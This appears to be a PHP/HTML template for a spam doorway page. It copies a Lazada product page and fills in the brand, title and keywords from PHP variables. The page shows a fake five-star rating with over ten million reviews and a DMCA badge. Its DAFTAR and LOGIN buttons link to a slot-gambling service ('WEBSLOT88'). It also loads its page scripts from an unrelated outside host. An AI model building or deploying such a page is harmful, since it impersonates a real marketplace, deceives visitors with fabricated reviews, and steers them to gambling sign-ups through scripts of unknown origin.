                  <span id="myAccountTrigger" class="grey"></span>
<div class="meta-account-popup top-popup-wrap" id="seoMyAccountPop">
  <div class="top-popup-content meta-account-content">
      <ul class="account-list">
          
      </ul>
  </div>
</div>
                </div>
            </div>
        </div>
        <div class="lzd-logo-bar">
          <div class="logo-bar-content header-content">
              <div class="lzd-logo-content"><a href="<?php echo htmlspecialchars($urlPath); ?>" data-spm="dhome"><img src="https://image-seotom.pages.dev/logo.png" alt="<?php echo htmlspecialchars($titleContent); ?>"></a></div>
              <div class="seo-nav-search " data-spm="search">
                <div id="button" data-spm-click="gostr=/<?php echo htmlspecialchars($BRANDS); ?>.togel.search;locaid=d_go"></div>
              </div>
                <div class="seo-nav-menu-redmart" style="display: none;">
  <div class="mui-zebra-module" id="J_icms-5000527-1511531232618" data-module-id="icms-5000527-1511531232618" data-version="5.0.83" data-spm="icms-5000527-1511531232618">
<div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
    <div class="lzd-site-menu-nav-container">
        <div class="lzd-site-menu-nav-category">
            <a href="<?php echo htmlspecialchars($urlPath); ?>">
                <span class="lzd-site-menu-nav-category-text">Kategori</span>
            </a>
            <div class="lzd-site-menu-nav-menu">
  <div class="mui-zebra-module" id="J_icms-5000518-1511530513406" data-module-id="icms-5000518-1511530513406" data-version="5.0.51" data-spm="icms-5000518-1511530513406">
<div class="lzd-site-nav-menu-dropdown" data-mod-name="@ali/lzdmod-site-menu-pc/pc/index" data-config="{}">
    <ul class="lzd-site-menu-root" data-spm="cate">
         
        </ul>
    </ul>
</div>
  </div>
            </div>
        </div>
        <nav class="lzd-menu-labels" data-spm="menu">
            <a class="lzd-menu-labels-item" href="<?php echo htmlspecialchars($urlPath); ?>">
                <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                    <img alt="<?php echo htmlspecialchars($BRANDS); ?>" class="lzd-site-nav-menu-iconfont-img" src="https://image-seotom.pages.dev/fav.png">
                </span>
                <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon <?php echo htmlspecialchars($BRANDS); ?>-channel-<?php echo htmlspecialchars($BRANDS); ?>">&#xe629;</i>-->
                <span class="lzd-menu-labels-item-text"><?php echo htmlspecialchars($BRANDS); ?></span>
            </a>
            <a class="lzd-menu-labels-item" href="<?php echo $domain; ?>/<?php echo htmlspecialchars($randomUrl); ?>">
                <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                    <img alt="<?php echo htmlspecialchars($randomKeyword); ?>" class="lzd-site-nav-menu-iconfont-img" src="https://image-seotom.pages.dev/fav.png">
                </span>
                <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon <?php echo htmlspecialchars($BRANDS); ?>-channel-MobileTop1">&#xe768;</i>-->
                        <span class="lzd-menu-labels-item-text"><?php echo htmlspecialchars($randomKeyword); ?></span>
            </a>
            <a class="lzd-menu-labels-item" href="<?php echo $domain; ?>/<?php echo htmlspecialchars($randomUrl2); ?>">
                <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                    <img alt="<?php echo htmlspecialchars($randomKeyword2); ?>" class="lzd-site-nav-menu-iconfont-img" src="https://image-seotom.pages.dev/fav.png">
                </span>
                <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon <?php echo htmlspecialchars($BRANDS); ?>-channel-Vouchers">&#xe76a;</i>-->
                        <span class="lzd-menu-labels-item-text"><?php echo htmlspecialchars($randomKeyword2); ?></span>
            </a>
            <a class="lzd-menu-labels-item" href="<?php echo $domain; ?>/<?php echo htmlspecialchars($randomUrl3); ?>">
                <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                    <img alt="<?php echo htmlspecialchars($randomKeyword3); ?>" class="lzd-site-nav-menu-iconfont-img" src="https://image-seotom.pages.dev/fav.png">
                </span>
                <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon <?php echo htmlspecialchars($BRANDS); ?>-Categories">&#xe765;</i>-->
                <span class="lzd-menu-labels-item-text"><?php echo htmlspecialchars($randomKeyword3); ?></span>
            </a>
        </nav>
    </div>
</div>
  </div>
                </div>
              <div class="seo-nav-cart">
                <a href="<?php echo htmlspecialchars($urlPath); ?>" data-spm="dcart"><span class="cart-icon"></span>
                <span class="cart-num" id="topActionCartNumber"></span></a>
              </div>
                <div class="lzd-header-banner" id="topActionLiveUpBanner">
                </div>
          </div>
        </div>
      </div>
  <div class="mui-zebra-module" id="J_icms-5000527-1511531232618" data-module-id="icms-5000527-1511531232618" data-version="5.0.83" data-spm="icms-5000527-1511531232618">
<div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
    <div class="lzd-site-menu-nav-container">
        <div class="lzd-site-menu-nav-category">
            <a href="<?php echo htmlspecialchars($urlPath); ?>">
                <span class="lzd-site-menu-nav-category-text">Kategori</span>
            </a>
            <div class="lzd-site-menu-nav-menu">
  <div class="mui-zebra-module" id="J_icms-5000518-1511530513406" data-module-id="icms-5000518-1511530513406" data-version="5.0.51" data-spm="icms-5000518-1511530513406">
<div class="lzd-site-nav-menu-dropdown" data-mod-name="@ali/lzdmod-site-menu-pc/pc/index" data-config="{}">
    <ul class="lzd-site-menu-root" data-spm="cate">
         
        <ul class="lzd-site-menu-sub Level_1_Category_No1" data-spm="cate_1">
            
        </ul>
    </ul>
</div>
  </div>
            </div>
        </div>
        <nav class="lzd-menu-labels" data-spm="menu">
            <a class="lzd-menu-labels-item" href="<?php echo htmlspecialchars($urlPath); ?>">
                <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                    <img alt="<?php echo htmlspecialchars($BRANDS); ?>" class="lzd-site-nav-menu-iconfont-img" src="https://image-seotom.pages.dev/fav.png">
                </span>
                <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon <?php echo htmlspecialchars($BRANDS); ?>-channel-<?php echo htmlspecialchars($BRANDS); ?>">&#xe629;</i>-->
                <span class="lzd-menu-labels-item-text"><?php echo htmlspecialchars($BRANDS); ?></span>
            </a>
            <a class="lzd-menu-labels-item" href="<?php echo $domain; ?>/<?php echo htmlspecialchars($randomUrl); ?>">
                <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                    <img alt="<?php echo htmlspecialchars($randomKeyword); ?>" class="lzd-site-nav-menu-iconfont-img" src="https://image-seotom.pages.dev/fav.png">
                </span>
                <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon <?php echo htmlspecialchars($BRANDS); ?>-channel-MobileTop1">&#xe768;</i>-->
                        <span class="lzd-menu-labels-item-text"><?php echo htmlspecialchars($randomKeyword); ?></span>
            </a>
            <a class="lzd-menu-labels-item" href="<?php echo $domain; ?>/<?php echo htmlspecialchars($randomUrl2); ?>">
                <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                    <img alt="<?php echo htmlspecialchars($randomKeyword2); ?>" class="lzd-site-nav-menu-iconfont-img" src="https://image-seotom.pages.dev/fav.png">
                </span>
                <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon <?php echo htmlspecialchars($BRANDS); ?>-channel-Vouchers">&#xe76a;</i>-->
                        <span class="lzd-menu-labels-item-text"><?php echo htmlspecialchars($randomKeyword2); ?></span>
            </a>
            <a class="lzd-menu-labels-item" href="<?php echo $domain; ?>/<?php echo htmlspecialchars($randomUrl3); ?>">
                <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                    <img alt="<?php echo htmlspecialchars($randomKeyword3); ?>" class="lzd-site-nav-menu-iconfont-img" src="https://image-seotom.pages.dev/fav.png">
                </span>
                <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon <?php echo htmlspecialchars($BRANDS); ?>-Categories">&#xe765;</i>-->
                <span class="lzd-menu-labels-item-text"><?php echo htmlspecialchars($randomKeyword3); ?></span>
            </a>
        </nav>
    </div>
</div>
  </div>
    </div>
  </div>
  <script>
function generateUUID() {
  var d = new Date().getTime();
  var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(
    c
  ) {
    var r = ((d + Math.random() * 16) % 16) | 0;
    d = Math.floor(d / 16);
    return (c == 'x' ? r : (r & 0x7) | 0x8).toString(16);
  });
  return uuid;
}
var lzdDocCookies = {
  getItem: function(sKey) {
    return (
      decodeURIComponent(
        document.cookie.replace(
          new RegExp(
            '(?:(?:^|.*;)\\s*' +
              encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, '\\$&') +
              '\\s*\\=\\s*([^;]*).*$)|^.*$'
          ),
          '$1'
        )
      ) || null
    );
  },
  setItem: function(sKey, sValue, vEnd, sPath, sDomain, bSecure) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) {
      return false;
    }
    var sExpires = '';
    var exdate = new Date();
    exdate.setDate(exdate.getDate() + vEnd);
    sExpires = ';expires=' + exdate.toGMTString();
    document.cookie =
      encodeURIComponent(sKey) +
      '=' +
      encodeURIComponent(sValue) +
      sExpires +
      (sDomain ? '; domain=' + sDomain : '') +
      (sPath ? '; path=' + sPath : '; path=/') +
      (bSecure ? '; secure' : '');
    return true;
  },
  hasItem: function(sKey) {
    if (!sKey) {
      return false;
    }
    return new RegExp(
      '(?:^|;\\s*)' +
        encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, '\\$&') +
        '\\s*\\='
    ).test(document.cookie);
  },
  removeItem: function(sKey, sPath, sDomain) {
    if (!this.hasItem(sKey)) {
      return false;
    }
    document.cookie =
      encodeURIComponent(sKey) +
      '=; expires=Thu, 01 Jan 1970 00:00:00 GMT' +
      (sDomain ? '; domain=' + sDomain : '') +
      (sPath ? '; path=' + sPath : '; path=/');
    return true;
  }
};
var LZD_HOST_ARRAY = [
  '.<?php echo htmlspecialchars($BRANDS); ?>.co.id',
  '.<?php echo htmlspecialchars($BRANDS); ?>.com.my',
  '.<?php echo htmlspecialchars($BRANDS); ?>.com.ph',
  '.<?php echo htmlspecialchars($BRANDS); ?>.sg',
  '.<?php echo htmlspecialchars($BRANDS); ?>.co.th',
  '.<?php echo htmlspecialchars($BRANDS); ?>.vn',
  '.<?php echo htmlspecialchars($BRANDS); ?>.com.bd',
  '.<?php echo htmlspecialchars($BRANDS); ?>.lk',
  '.<?php echo htmlspecialchars($BRANDS); ?>.com.mm',
  '.<?php echo htmlspecialchars($BRANDS); ?>.com.np',
  '.<?php echo htmlspecialchars($BRANDS); ?>.pk',
  '.<?php echo htmlspecialchars($BRANDS); ?>.test'
];
var currentDomain = '.<?php echo htmlspecialchars($BRANDS); ?>.sg';
var UUID = generateUUID();
var t_uid = lzdDocCookies.getItem('t_uid');
var anon_uid = lzdDocCookies.getItem('anon_uid');
for (var i = 0; i < LZD_HOST_ARRAY.length; i++) {
  if (window.location.host.indexOf(LZD_HOST_ARRAY[i]) > -1) {
    currentDomain = LZD_HOST_ARRAY[i];
  }
}
if (!lzdDocCookies.getItem('lzd_cid')) {
  lzdDocCookies.setItem('lzd_cid', UUID, 365, null, currentDomain);
}
if (!lzdDocCookies.getItem('t_uid')) {
  if (anon_uid) {
    lzdDocCookies.setItem('t_uid', anon_uid, 365, null, currentDomain);
  } else {
    lzdDocCookies.setItem('t_uid', UUID, 365, null, currentDomain);
  }
}
</script>
</div>
  </div>
<input type="hidden" id="header-pc-config" value="{&quot;voyagerVersion&quot;:&quot;2&quot;,&quot;voyagerEnv&quot;:&quot;product&quot;,&quot;assetsRefactor&quot;:false,&quot;regionID&quot;:&quot;ID&quot;,&quot;language&quot;:&quot;id&quot;,&quot;react&quot;:false,&quot;needUmid&quot;:false,&quot;channel&quot;:&quot;pdp&quot;,&quot;customName&quot;:&quot;default&quot;,&quot;version&quot;:{&quot;nav&quot;:&quot;5.2.32&quot;,&quot;search&quot;:&quot;0.4.11&quot;,&quot;menu&quot;:&quot;5.0.45&quot;,&quot;menuNav&quot;:&quot;5.0.73&quot;,&quot;suffix&quot;:&quot;&quot;},&quot;needRetCode&quot;:true,&quot;retCodePageName&quot;:&quot;&quot;,&quot;hideCategory&quot;:true,&quot;needReact&quot;:false,&quot;thymeleaf&quot;:true,&quot;grayFilter&quot;:{&quot;TH&quot;:false,&quot;SG&quot;:false,&quot;MY&quot;:false,&quot;ID&quot;:false,&quot;PH&quot;:false,&quot;VN&quot;:false},&quot;isHomePage&quot;:false,&quot;isMiniHeader&quot;:false,&quot;java&quot;:true}">
    <!-- Floating Cart UMD -->
    <script>
        window.__LIB_CART_SCENE__ = 'pdp';
        window.__LIB_CART_VERSION__ = '1.0.16';
        window.__LIB_CART_ASSETS_ENV__ = 'product';
    </script>
    <!-- PC Login / Signup Popup UMD -->
    <!-- online version -->
    <script>
        window.__LIB_LOGIN_SIGNUP_POPUP_VERSION__ = '0.0.4';
    </script>
  <div id="pdp-nav">
    <div>
  <div>
    <style>
      .breadcrumb_list {
        width: 1188px;
        height: 48px;
        border-bottom: 1px solid #EFF0F5;
        margin: 0 auto;
        overflow: hidden;
        text-overflow: ellipsis;
      }

      .breadcrumb_list_empty {
        height: 0;
        border: none;
        overflow: hidden;
      }

      .breadcrumb_list .breadcrumb {
        padding-left: 0;
        margin-left: -4px;
        height: 48px;
        vertical-align: middle;
        display: inline-block;
        white-space: nowrap;
      }

      .breadcrumb_list .breadcrumb .breadcrumb_item {
        position: relative;
        display: table-cell;
        vertical-align: middle;
        font-size: 13px;
        font-weight: 300;
        height: 48px;
      }

      .breadcrumb_list .breadcrumb .breadcrumb_item .breadcrumb_item_text {
        vertical-align: middle;
        padding: 0;
        margin: 0;
        line-height: 100%;
        display: inline-block;
        font-weight: 300;
      }

      .breadcrumb_list .breadcrumb .breadcrumb_item .breadcrumb_item_text .breadcrumb_item_anchor {
        display: inline-block;
        vertical-align: middle;
        color: #1a9cb7;
        padding: 0 4px;
        font-size: 14px;
        font-family: Roboto-Regular, Helvetica, Arial, sans-serif;
        max-width: 200px;
        white-space: nowrap;
        line-height: 16px;
        overflow: hidden;
        text-overflow: ellipsis;
      }

      .breadcrumb_list .breadcrumb .breadcrumb_item .breadcrumb_item_text .breadcrumb_item_anchor_last {
        color: #757575;
        max-width: none;
        height: 16px;
        line-height: 16px;
        white-space: normal;
      }

      .breadcrumb_list .breadcrumb .breadcrumb_item .breadcrumb_item_text .breadcrumb_right_arrow {
        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAACKUExURUxpcYGBgYGBgYWFhYCAgICAgICAgIKCgv///4GBgZWVlYyMjIGBgYCAgIKCgoGBgYGBgaqqqoODg7+/v4GBgZKSko6OjoGBgYWFhYGBgYSEhIGBgZmZmYCAgIGBgYGBgYCAgICAgIGBgYCAgICAgIiIiICAgIeHh4GBgYSEhIODg4GBgYGBgYCAgPLijmAAAAAtdFJOUwCS7jCDi/E1AbYMFJrrK9ToAycEugcJtBfYG64Fp+S+vb+god0e4SLcHyPgwPJLUkAAAAB6SURBVDjLY2AYYoCdkwu/AgVdHTG8Crj5dUVE8aqQkNQVl8GrQkpDV1oYrwpVbV1ZQbwq1OV0lTnwqhAS0OXBr4KPV5cRf3AwM+myEghRNl0WihQQsoKQIwl5U0tOVwmfvKYa/qCWUsEfWYSim2CCkddVFKMs0Q5aAABM4wlSQJ87yAAAAABJRU5ErkJggg==);
        background-repeat: no-repeat;
        background-size: contain;
        display: inline-block;
        width: 16px;
        height: 16px;
        vertical-align: middle;
      }
    </style>
  <style>
  .baxia-dialog {
 display: none!important;
 }
 </style>
    <div data-spm="breadcrumb" id="J_breadcrumb_list" class="breadcrumb_list breadcrumb_custom_cls">
      <ul class="breadcrumb" id="J_breadcrumb">

      </ul>
    </div>
    <script>
      function htmlEncodePdp(input) {
        var el = document.createElement("div");
        el.innerText = input;
        return el.innerHTML;
      };
      window.LZD = window.LZD || {};
      window.LZD.updateBreadcrumb = function (list) {
        if (!list || !list instanceof Array) {
          return;
        }
        var parentNode = document.getElementById('J_breadcrumb');
        while (parentNode.hasChildNodes()) {
          parentNode.removeChild(parentNode.firstChild);
        }
        var size = list.length;
        for (var i = 0; i < size; i++) {
          var item = list[i];
          item.title = htmlEncodePdp(item.title);
          var liNode = document.createElement("li");
          liNode.className = 'breadcrumb_item';
          if (i === size - 1) {
            liNode.innerHTML = '<span class="breadcrumb_item_text">' +
              '<span class="breadcrumb_item_anchor breadcrumb_item_anchor_last">' + item.title + '</span>' +
              '</span>';
          } else {
            if(item.url) {
              item.url = window.location.host.indexOf('h5.<?php echo htmlspecialchars($BRANDS); ?>.') > -1 ? item.url.replace('www.<?php echo htmlspecialchars($BRANDS); ?>.', 'h5.<?php echo htmlspecialchars($BRANDS); ?>.') : item.url;
            }
            liNode.innerHTML = '<span class="breadcrumb_item_text">' +
              '<a title="' + item.title + '" href="' + item.url + '" class="breadcrumb_item_anchor">' +
              '<span>' + item.title + '</span>' +
              '</a>' +
              '<div class="breadcrumb_right_arrow"></div>' +
              '</span>';
          }
          parentNode.appendChild(liNode);
        }
        var breadcrumbListNode = document.getElementById('J_breadcrumb_list');
        var cls = breadcrumbListNode.className;
        if (size === 0) {
          if (cls.indexOf('breadcrumb_list_empty') < 0) {
            breadcrumbListNode.className = 'breadcrumb_list_empty';
          }
        } else {
          breadcrumbListNode.className = 'breadcrumb_list';
        }
      }
    </script>
  </div>
</div>
<div class="REKOMENDASI">
  <a href="https://linkr.bio/WEBSLOT88/" rel="nofollow noreferrer" class="register">DAFTAR</a>
  <a href="https://linktr.ee/WEBSLOT88/" rel="nofollow noreferrer" class="login">LOGIN</a>
  </div>


  <style>
      .REKOMENDASI {
      display: grid;
      grid-template-columns: repeat(2,1fr);
      font-weight: 700;
      }
      .REKOMENDASI a {
      text-align: center;
      }
      .login {
      color: #ffffff;
      padding: 13px 10px;
      }

      .register {
      color: #ffffff;
      padding: 13px 10px;
      }
      
      .login, .login-button {
      border: 1px solid #6f0000;
      background: linear-gradient(to bottom,#09ff00 0,rgb(13, 54, 0) 100%);
      border: 1px solid #ff0000;
      }
      .register, .register-button {
      background: linear-gradient(to bottom, #ffd700 0, #000000 100%);
      border: 1px solid #ff0000;
      }
      </style>
  </div>
  <div id="container" style="visibility: visible;">
    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="<?php echo htmlspecialchars($titleContent); ?>" src="https://image-seotom.pages.dev/banner<?php echo htmlspecialchars($Number); ?>.jpg"/></div></div><div class="next-slick next-slick-outer next-slick-horizontal item-gallery-slider"><div class="next-slick-inner next-slick-initialized" draggable="true"><div class="next-slick-list"><div class="next-slick-track"><div style="outline:none;width:52px" class="next-slick-slide next-slick-active next-slick-cloned item-gallery__thumbnail item-gallery__thumbnail_state_active" <?php echo htmlspecialchars($BRANDS); ?>_pdp_gallery_tpp_track="gallery" main_image_number="1" data-index="0" tabindex="-1"><div class="item-gallery__image-wrapper"></div></div></div></div><div data-role="none" class="next-slick-arrow next-slick-prev outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-left next-icon-medium"></i></div><div data-role="none" class="next-slick-arrow next-slick-next outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-right next-icon-medium"></i></div></div></div></div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title"><?php echo htmlspecialchars($titleContent); ?></h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://kilat.digital/images/2025/07/13/43096a6e1613b97203298f0d760c8eb0.png"/><img class="star" src="https://kilat.digital/images/2025/07/13/43096a6e1613b97203298f0d760c8eb0.png"/><img class="star" src="https://kilat.digital/images/2025/07/13/43096a6e1613b97203298f0d760c8eb0.png"/><img class="star" src="https://kilat.digital/images/2025/07/13/43096a6e1613b97203298f0d760c8eb0.png"/><img class="star" src="https://kilat.digital/images/2025/07/13/43096a6e1613b97203298f0d760c8eb0.png"/></div><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="<?php echo htmlspecialchars($BRANDS); ?>.pdp_revamp.0.0">10.200.700 Penilaian</a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module"><div class="pdp-product-brand"><span class="pdp-product-brand__name">Merek<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="<?php echo htmlspecialchars($urlPath); ?>"><?php echo htmlspecialchars($BRANDS); ?></a><div class="pdp-product-brand__divider"></div></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div>
    <div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price"><p style="text-align: justify; margin-bottom:5px;"><?php echo htmlspecialchars($metadesContent); ?></p>

        <div style="text-align: center; margin: 20px 0;">
                                        <a href="<?php echo htmlspecialchars($urlPath); ?>"
                                            title="DMCA.com Protection Status" class="dmca-badge">
                                            <img src="https://images.dmca.com/Badges/_dmca_premi_badge_5.png?ID=bc512c80-6bae-4c99-854d-2e3d0814893d" alt="DMCA.com Protection Status" />
                                        </a>
                                    </div>
                                    
    <div class="pdp-product-price" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_normal pdp-price_color_orange pdp-price_size_xl" data-spm-anchor-id="<?php echo htmlspecialchars($BRANDS); ?>.pdp_revamp.0.i0.241073bdUG5ius">Rp.10.000</span><div class="origin-block" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_deleted pdp-price_color_lightgray pdp-price_size_xs"></span><span class="pdp-product-price__discount">Diskon hingga 95%</span></div></div></div></div><div id="module_redmart_product_price" class="pdp-block module"></div><div id="module_promotion_tags" class="pdp-block module"></div><div id="module_installment" class="pdp-block module"></div><div id="module_quantity-input" class="pdp-block module"><div class="pdp-mod-product-info-section sku-quantity-selection" bis_skin_checked="1"><h6 class="section-title">Kuantitas</h6><div class="section-content" bis_skin_checked="1"><div class="next-number-picker next-number-picker-inline" bis_skin_checked="1"><div class="next-number-picker-handler-wrap" bis_skin_checked="1"><a unselectable="unselectable" class="next-number-picker-handler next-number-picker-handler-up "><span unselectable="unselectable" class="next-number-picker-handler-up-inner"><i class="next-icon next-icon-add next-icon-medium"></i></span></a><a unselectable="unselectable" class="next-number-picker-handler next-number-picker-handler-down next-number-picker-handler-down-disabled"><span unselectable="unselectable" class="next-number-picker-handler-down-inner"><i class="next-icon next-icon-minus next-icon-medium"></i></span></a></div><div class="next-number-picker-input-wrap" bis_skin_checked="1"><span class="next-input next-input-single next-input-medium next-number-picker-input"><input min="1" max="5" step="1" autocomplete="off" type="text" height="100%" value="1"></span></div></div><span class="quantity-content-default"></span></div></div></div><div id="module_sms-phone-input" class="pdp-block module"></div></div><div id="module_redmart_add_to_cart" class="pdp-block module"></div></div><div id="block-O-HF3LN4YVI" class="pdp-block pdp-block__delivery-seller"><div id="module_seller_delivery" class="pdp-block module"><div data-spm="delivery_options" data-nosnippet="true"></div></div><div id="module_redmart_delivery" class="pdp-block module"></div><div id="module_seller_warranty" class="pdp-block module"></div><div id="module_guide_app" class="pdp-block module"></div><div id="module_redmart_service" class="pdp-block module"></div><div id="module_seller_info" class="pdp-block module"><div class="seller-container" data-spm="seller"><div class="seller-name"><div class="seller-name__wrapper"><div class="seller-name__title">Created by Seo TOM</div><div class="seller-name__detail" data-spm="seller"><a class="pdp-link pdp-link_size_l pdp-link_theme_black seller-name__detail-name"></a></div></div></div><div class="pdp-seller-info-pc"></div></div></div><div id="module_redmart_seller_info" class="pdp-block module"></div></div></div></div></div></div>
  </div>

  <script>
    // add crossorigin for error monitoring
    var requirejs = {
      onNodeCreated: function (node, config, id, url) {
        node.setAttribute('crossorigin', 'anonymous');
      }
    };
  </script>
  <script src="https://asset-satset.info/lazada/ane.js"></script>
    <script>
  function pdpLog(logkey, gmkey = 'CLK', args = {}, chksum = '') {
    if (!logkey) return;
    var pdpMsiteExperimentEnable = window.__pdpMsiteExperimentEnable__ || false;
    var pdpMsiteExperimentBucketId = window.__pdpMsiteExperimentConfig__ ? window.__pdpMsiteExperimentConfig__.bucketId : '-';

    var query = '';
    if (Object.prototype.toString.call(args) === '[object Object]') {
      query = Object.keys(args).map(function (key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(args[key]);
      }).join('&');
      query = '&' + query;
    }

    var gokey = 'pdpMsiteExperimentEnable=' + pdpMsiteExperimentEnable + '&pdpMsiteExperimentBucketId=' + pdpMsiteExperimentBucketId + query;

    if (window.goldlog && window.goldlog.record) {
      window.goldlog.record(logkey, gmkey, gokey, chksum);
    } else {
      window.goldlog_queue = window.goldlog_queue || [];
      window.goldlog_queue.push({
        action: 'goldlog.record',
        arguments: [logkey, gmkey, gokey],
      });
    }
  }

  function reportMtopData() {
      if (window.__wpk && window.__pdpMtopStartTime) {
        window.__wpk.report({
          category: 111, //??????,???"????"
          msg: 'PDP CSR MTOP API Success Rate', //???????
          w_succ: window.__pdpMtopStatus || 0, // ??,?????????,?????????0?1
          wl_avgv1: window.__pdpMtopEndTime ? window.__pdpMtopEndTime - window.__pdpMtopStartTime : 0, // ??,??????????,???????,?????
          c1: window.__regionID__
        })
      }
  }

  function reportMtopData2() {
      if (window.__wpk && window.__pdpTriggerCSR) {
        window.__wpk.report({
          category: 112, //??????,???"????"
          msg: 'PDP CSR MTOP API Trigger Rate', //???????
          w_succ: window.__pdpTriggerMtopStatus, // ??,?????????,?????????0?1
          c1: window.__regionID__
        })
      }
  }

  function reportMtopData3() {
    if (window.__wpk) {
      window.__wpk.report({
        category: 113, //??????,???"????"
        msg: 'PDP CSR Hydrate Success Rate', //???????
        w_succ: window.__pdpHydrateStatus || 0, // ??,?????????,?????????0?1
        c1: window.__regionID__
      })
    }
  }

  function hydrate() {

    var modulePath = 'https://asset-satset.info/lazada/aca-aca.js';

    window.__pdpHydrateStatus = 0;
    require([modulePath], function (app) {
      try {
        console.log('start run...')
        app.run(__moduleData__, function() {
          timings.render = Date.now();
          pdpLog('/<?php echo htmlspecialchars($BRANDS); ?>_bounce_rendered', 'EXP', {content: "pdp-m"})
          window.__pdpHydrateStatus = 1;
          var loading = document.getElementById('pdp-skeleton-new');
          if(loading) {
            loading.style.display = 'none';
          }
          reportMtopData3();
        })
      } catch (e) {
        console.error('render error', e);
        reportMtopData3();
        if (window._blReport) {
          window._blReport('error', [
            e,
            {
              file: 'page.html'
            },
          ]);
        }
        // window.location.reload();
      }
    });
  }
</script>


  <!-- start footer -->

      
 
  <div class="lzd-footer-width-25">
    <div class="lzd-footer-copyright">
      &copy; <?php echo htmlspecialchars($BRANDS); ?> - All Rights Reserved
    </div>
  </div>
<div id="webim-container" onclick="javascript:goldlog.record('/<?php echo htmlspecialchars($BRANDS); ?>.IM.im-msgbox','CLK','platform=desktop&amp;pagename='+ window.LZD_RETCODE_PAGENAME || 'other','GET')"></div>

  <style>
      .m-common-more .link-<?php echo htmlspecialchars($BRANDS); ?>-Message{
        display: none;
      }
  </style>
  </div>

<script>
(function(S) {
  window.g_config = window.g_config || {};
  S.config(window.g_config.seed);
  S.config('combine', true);
  feloader.noConflict();
})(feloader);
</script>
<script>
  feloader.require('@ali/lzdmod-site-nav-pc/pc/index',function(mod){
    mod()
  });
</script>
<script>
    var lzdRetcodePageName = window.LZD_RETCODE_PAGENAME || '' || location.pathname;
    if (window.LZD_ROUTER_POSTFIX) {
      if (lzdRetcodePageName.indexOf(window.LZD_ROUTER_POSTFIX) === -1) {
        lzdRetcodePageName = lzdRetcodePageName + window.LZD_ROUTER_POSTFIX;
      }
    }
    var lzdRetcodePid = window.LZD_RETCODE_PID || 'hyey0hz67v@0edb7c0e5e09aea';
    var lzdRetcodeSample = window.LZD_RETCODE_SAMPLE || 10;
    var autoSendPerf = true;
    var sendPerfManually = '';
    if(sendPerfManually === 'true'){
        autoSendPerf = false;
    }
